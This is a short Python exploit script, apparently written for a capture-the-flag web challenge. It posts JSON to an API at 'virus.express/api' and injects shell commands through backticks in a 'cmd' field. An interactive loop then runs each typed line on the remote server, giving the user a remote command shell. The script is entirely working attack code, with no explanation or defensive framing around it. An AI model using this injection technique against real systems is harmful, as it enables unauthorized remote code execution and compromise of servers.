#!/usr/bin/python
from pwn import *
import requests
import json

BASEURL = "http://virus.express/api"

SESSION = requests.Session()
COOKIE = {"t19userid":"YOURCOOKIEHERE"}

def Post(url, data):
	return SESSION.post(format(url),data, cookies=COOKIE).text

def execute_cmd(cmd):
	js = { 
		"file" : 
			{
				"hash" : "f31a20cbe28c22ad7e6c46b989804e2c", 
				"name2": "2" 
			},
		"cmd" : "echo `%s`" % cmd
	}

	print Post(BASEURL, json.dumps(js))

def exploit():
	SESSION.headers.update({ "Content-Type" : "application/json"})
			
	while True:
		inp = raw_input("> ")
		execute_cmd(inp)
	
	return

if __name__ == "__main__":
	exploit()
